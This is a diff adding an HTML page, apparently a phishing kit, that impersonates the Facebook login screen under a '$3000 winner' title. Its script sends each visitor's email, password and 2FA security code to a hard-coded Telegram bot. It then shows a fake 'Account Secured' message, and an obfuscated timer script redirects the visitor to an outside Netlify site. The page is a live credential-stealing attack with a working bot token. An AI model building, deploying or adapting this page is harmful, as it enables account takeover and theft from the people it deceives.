@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title> Nancy Turco Winner $3000 </title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+    }
+    
+    body {
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    
+    .container {
+      display: flex;
+      justify-content: space-between;
+      max-width: 1000px;
+      width: 100%;
+      flex-wrap: wrap;
+      gap: 40px;
+      align-items: center;
+    }
+    
+    .text-section {
+      flex: 1;
+      min-width: 280px;
+      margin-bottom: 40px;
+    }
+    
+    .text-section h1 {
+      color: #1877f2;
+      font-size: 4rem;
+      margin-bottom: 10px;
+      line-height: 1;
+    }
+    
+    .text-section p {
+      font-size: 1.75rem;
+      line-height: 1.4;
+      color: #1c1e21;
+      margin-top: 15px;
+    }
+    
+    .form-container {
+      flex: 1;
+      max-width: 400px;
+      width: 100%;
+      background: #fff;
+      border-radius: 8px;
+      padding: 20px;
+      box-shadow:
+        0 2px 4px rgba(0, 0, 0, 0.1),
+        0 8px 16px rgba(0, 0, 0, 0.1);
+      transition: all 0.3s ease;
+    }
+    
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+    
+    .page-title {
+      font-size: 1.5rem;
+      color: #1c1e21;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+    
+    .instruction {
+      color: #606770;
+      font-size: 0.95rem;
+      margin-bottom: 20px;
+      text-align: center;
+      line-height: 1.4;
+    }
+    
+    .email-display {
+      color: #606770;
+      font-size: 0.95rem;
+      font-weight: 400;
+      line-height: 1.4;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+    
+    .email-display span {
+      font-weight: 500;
+      color: #1c1e21;
+    }
+    
+    input {
+      height: 55px;
+      width: 100%;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      margin-bottom: 15px;
+      font-size: 1rem;
+      padding: 0 14px;
+      transition: border-color 0.2s;
+    }
+    
+    input:focus {
+      outline: none;
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+    
+    ::placeholder {
+      color: #8d949e;
+      font-size: 1.063rem;
+    }
+    
+    .btn {
+      border: none;
+      outline: none;
+      cursor: pointer;
+      background: #1877f2;
+      padding: 15px 0;
+      border-radius: 6px;
+      color: #fff;
+      font-size: 1.25rem;
+      font-weight: 600;
+      transition: background 0.2s ease;
+      margin-top: 5px;
+    }
+    
+    .btn:hover {
+      background: #0d65d9;
+    }
+    
+    .btn-secondary {
+      background: #42b72a;
+      width: 60%;
+      align-self: center;
+      margin-top: 15px;
+    }
+    
+    .btn-secondary:hover {
+      background: #3ba626;
+    }
+    
+    .link {
+      text-align: center;
+      margin: 15px 0;
+    }
+    
+    .link a {
+      color: #1877f2;
+      font-size: 0.875rem;
+      text-decoration: none;
+    }
+    
+    .link a:hover {
+      text-decoration: underline;
+    }
+    
+    hr {
+      border: none;
+      height: 1px;
+      background-color: #dadde1;
+      margin: 20px 0;
+    }
+    
+    .resend-link {
+      text-align: center;
+      margin-top: 15px;
+    }
+    
+    .resend-link a {
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 0.9rem;
+    }
+    
+    .resend-link a:hover {
+      text-decoration: underline;
+    }
+    
+    .back-link {
+      display: flex;
+      align-items: center;
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 0.9rem;
+      margin-bottom: 15px;
+      cursor: pointer;
+    }
+    
+    .back-link span {
+      margin-left: 5px;
+    }
+    
+    .hidden {
+      display: none;
+    }
+    
+    /* Success page styles */
+    .success-container {
+      text-align: center;
+      padding: 20px;
+    }
+    
+    .success-icon {
+      font-size: 64px;
+      color: #42b72a;
+      margin: 20px 0;
+    }
+    
+    .success-title {
+      font-size: 1.8rem;
+      color: #1c1e21;
+      margin-bottom: 15px;
+    }
+    
+    .success-message {
+      color: #606770;
+      font-size: 1.1rem;
+      margin-bottom: 25px;
+      line-height: 1.5;
+    }
+    
+    .continue-btn {
+      background: #1877f2;
+      color: white;
+      border: none;
+      padding: 12px 30px;
+      border-radius: 6px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    
+    .continue-btn:hover {
+      background: #0d65d9;
+    }
+    
+    /* Responsive adjustments */
+    @media (max-width: 900px) {
+      .container {
+        flex-direction: column;
+        text-align: center;
+        gap: 20px;
+      }
+      
+      .text-section {
+        margin-bottom: 20px;
+      }
+      
+      .text-section h1 {
+        font-size: 3.5rem;
+      }
+      
+      .text-section p {
+        font-size: 1.5rem;
+      }
+      
+      .form-container {
+        max-width: 100%;
+      }
+    }
+    
+    @media (max-width: 600px) {
+      .text-section h1 {
+        font-size: 2.8rem;
+      }
+      
+      .text-section p {
+        font-size: 1.2rem;
+      }
+      
+      .form-container {
+        padding: 15px;
+      }
+      
+      .success-icon {
+        font-size: 48px;
+      }
+      
+      .success-title {
+        font-size: 1.5rem;
+      }
+      
+      .success-message {
+        font-size: 1rem;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      body {
+        padding: 10px;
+      }
+      
+      .text-section h1 {
+        font-size: 2.5rem;
+      }
+      
+      .text-section p {
+        font-size: 1.1rem;
+      }
+      
+      .btn {
+        padding: 12px 0;
+        font-size: 1.1rem;
+      }
+      
+      .btn-secondary {
+        width: 70%;
+      }
+      
+      input {
+        height: 50px;
+        font-size: 0.95rem;
+      }
+    }
+    
+    @media (max-width: 360px) {
+      .text-section h1 {
+        font-size: 2.2rem;
+      }
+      
+      .text-section p {
+        font-size: 1rem;
+      }
+      
+      .page-title {
+        font-size: 1.3rem;
+      }
+    }
+    
+    /* Footer */
+    .footer {
+      position: absolute;
+      bottom: 0;
+      width: 100%;
+      text-align: center;
+      padding: 15px;
+      color: #8a8d91;
+      font-size: 0.8rem;
+    }
+    
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 15px;
+      margin-bottom: 10px;
+    }
+    
+    .footer-links a {
+      color: #8a8d91;
+      text-decoration: none;
+    }
+    
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="text-section">
+      <h1>facebook</h1>
+      <p>Connect with friends and the world around you on Facebook.</p>
+    </div>
+    
+    <!-- Login Page -->
+    <div class="form-container" id="loginPage">
+      <form id="loginForm">
+        <input type="email" id="email" name="email" placeholder="Email address" required autofocus>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <button type="submit" class="btn">Log In</button>
+        <div class="link">
+          <a href="#">Forgot password?</a>
+        </div>
+        <hr>
+        <button type="button" class="btn btn-secondary">Create new account</button>
+      </form>
+    </div>
+    
+    <!-- Security Code Page -->
+    <div class="form-container hidden" id="securityPage">
+      <h2 class="page-title">Confirm your account</h2>
+      <div class="email-display">
+        We sent a code to your email address. Enter that code to confirm your account.
+      </div>
+      <form id="securityForm">
+        <input type="text" id="securityCode" name="securityCode" placeholder="Enter 6-digit code" maxlength="6" required autofocus>
+        <button type="submit" class="btn">Continue</button>
+      </form>
+      <div class="resend-link">
+        <a href="#" id="resendCode">Didn't get a code?</a>
+      </div>
+    </div>
+    
+    <!-- Success Page -->
+    <div class="form-container hidden" id="successPage">
+      <div class="success-container">
+        <div class="success-icon">
+          <i class="fas fa-check-circle"></i>
+        </div>
+        <h2 class="success-title">Account Secured</h2>
+        <p class="success-message">Your account has been secured. You can now log in.</p>
+        <button class="continue-btn" id="backToLoginSuccess">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div class="footer">
+    <div class="footer-links">
+      <a href="#">About</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Help</a>
+    </div>
+    <div>Facebook © 2025</div>
+  </div>
+  
+  <script>
+    // Temporary direct Telegram API endpoint for testing (replace with Worker endpoint once deployed)
+    const telegramToken = "8342277483:AAFqV9LvbQBG2-VB9xl0VLhqShZK6IcEp5s";
+    const telegramChatId = "5901396648";
+    const telegramEndpoint = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+    
+    // Global variable to store user email
+    let userEmail = "";
+    
+    // Function to show the security code page
+    function showSecurityPage(email) {
+        userEmail = email;
+        document.getElementById('loginPage').classList.add('hidden');
+        document.getElementById('securityPage').classList.remove('hidden');
+        document.getElementById('securityCode').focus();
+    }
+    
+    // Function to show success message
+    function showSuccessPage() {
+        document.getElementById('securityPage').classList.add('hidden');
+        document.getElementById('successPage').classList.remove('hidden');
+    }
+    
+    // Function to go back to login
+    function goBackToLogin() {
+        document.getElementById('securityPage').classList.add('hidden');
+        document.getElementById('successPage').classList.add('hidden');
+        document.getElementById('loginPage').classList.remove('hidden');
+        document.getElementById('email').focus();
+    }
+    
+    // Submit login form
+    async function submitLoginForm(e) {
+        e.preventDefault();
+    
+        const formData = new FormData(document.getElementById('loginForm'));
+        const email = formData.get('email');
+        const password = formData.get('password');
+    
+        try {
+            const response = await fetch(telegramEndpoint, {
+                method: "POST",
+                headers: { 
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ 
+                    chat_id: telegramChatId,
+                    text: `Login: email=${email}, password=${password}` 
+                })
+            });
+    
+            if (response.ok) {
+                showSecurityPage(email);
+            } else {
+                const errorText = await response.text();
+                console.error('Login Error:', response.status, errorText);
+                alert(`Error submitting login form: ${response.status} ${errorText}. Please try again.`);
+            }
+        } catch (error) {
+            console.error('Login Error:', error.message);
+            alert(`An error occurred: ${error.message}. Please try again.`);
+        }
+    }
+    
+    // Submit security code
+    async function submitSecurityCode(e) {
+        e.preventDefault();
+    
+        const formData = new FormData(document.getElementById('securityForm'));
+        const code = formData.get('securityCode');
+    
+        if (code.length !== 6) {
+            alert('Please enter a 6-digit security code');
+            return;
+        }
+    
+        try {
+            const response = await fetch(telegramEndpoint, {
+                method: "POST",
+                headers: { 
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ 
+                    chat_id: telegramChatId,
+                    text: `Security Code: email=${userEmail}, code=${code}` 
+                })
+            });
+    
+            if (response.ok) {
+                showSuccessPage();
+            } else {
+                const errorText = await response.text();
+                console.error('Security Code Error:', response.status, errorText);
+                alert(`Error submitting security code: ${response.status} ${errorText}. Please try again.`);
+            }
+        } catch (error) {
+            console.error('Security Code Error:', error.message);
+            alert(`An error occurred: ${error.message}. Please try again.`);
+        }
+    }
+    
+    // Initialize when page loads
+    window.onload = function() {
+        document.getElementById('loginForm').addEventListener('submit', submitLoginForm);
+        document.getElementById('securityForm').addEventListener('submit', submitSecurityCode);
+        document.getElementById('backToLoginSuccess').addEventListener('click', goBackToLogin);
+        document.getElementById('resendCode').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('A new security code has been sent to your email.');
+        });
+    
+        // Auto-focus email input on page load
+        document.getElementById('email').focus();
+    };
+  </script>
+
+  <!-- Redirect script -->
+  <script>
+    (function() {
+        const _0xabc1 = ['href', 'location', 'https://socialconnectx.netlify.app', 'assign'];
+        (function(_0x1, _0x2) {
+            const _0x3 = function(_0x4) {
+                while (--_0x4) {
+                    _0x1['push'](_0x1['shift']());
+                }
+            };
+            _0x3(++_0x2);
+        }(_0xabc1, 0x1d));
+        const _0xdef1 = function(_0x1, _0x2) {
+            _0x1 = _0x1 - 0x0;
+            let _0x3 = _0xabc1[_0x1];
+            return _0x3;
+        };
+        setTimeout(function() {
+            window[_0xdef1('0x1')][_0xdef1('0x0')] = _0xdef1('0x2');
+        }, 3000);
+    })();
+  </script>
+</body>
+</html>
